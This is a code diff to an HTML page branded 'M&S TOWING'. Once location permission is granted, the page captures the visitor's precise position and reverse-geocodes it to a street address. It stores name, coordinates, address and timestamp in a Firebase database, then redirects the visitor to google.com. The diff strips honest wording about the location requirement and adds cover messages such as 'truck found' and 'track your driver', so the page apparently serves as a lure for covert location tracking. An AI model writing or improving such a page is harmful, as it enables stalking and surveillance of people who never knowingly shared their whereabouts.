@@ -4,7 +4,6 @@
   <title>M&S TOWING</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
@@ -19,7 +18,7 @@
 
 <h2>M&S TOWING</h2>
 
-<input id="nameInput" placeholder="Enter name or phone number">
+<input id="nameInput" placeholder=>
 <button id="enterBtn" onclick="startTracking()" disabled>ENTER SITE</button>
 
 <p id="status">Checking location permission...</p>
@@ -32,13 +31,12 @@ const firebaseConfig = {
   projectId: "phone-b3f5d"
 };
 
-// Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 let watchId;
 
-// Check location permission
+// Check location permission and enable button
 function checkLocationPermission() {
   if (!navigator.geolocation) {
     document.getElementById("status").innerText = "Geolocation not supported";
@@ -48,11 +46,11 @@ function checkLocationPermission() {
   navigator.geolocation.getCurrentPosition(
     () => {
       document.getElementById("enterBtn").disabled = false;
-      document.getElementById("status").innerText = "Location enabled ✔ You can enter";
+      document.getElementById("status").innerText = "truck found";
     },
     () => {
       document.getElementById("enterBtn").disabled = true;
-      document.getElementById("status").innerText = "You must allow location to continue";
+      document.getElementById("status").innerText = "track your driver";
     }
   );
 }
@@ -60,7 +58,6 @@ function checkLocationPermission() {
 // Call on page load
 checkLocationPermission();
 
-// Reverse geocode to get address from lat/lng
 async function getAddress(lat, lng) {
   try {
     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
@@ -71,13 +68,11 @@ async function getAddress(lat, lng) {
   }
 }
 
-// Start tracking
 function startTracking() {
   const inputField = document.getElementById("nameInput");
   let userName = inputField.value.trim();
 
   if (!userName) {
-    // Auto-generate a name if empty
     userName = "user_" + Math.random().toString(36).substr(2, 6);
   }
 
@@ -96,14 +91,18 @@ function startTracking() {
       lng,
       address,
       timestamp: Date.now()
+    }).then(() => {
+      console.log("Firebase write success");
+    }).catch(err => {
+      console.error("Firebase write error:", err);
     });
+
   }, (err) => {
     alert("Error getting location: " + err.message);
   }, {
     enableHighAccuracy: true
   });
 
-  // Redirect after tracking starts
   setTimeout(() => {
     window.location.replace("https://www.google.com");
   }, 1500);
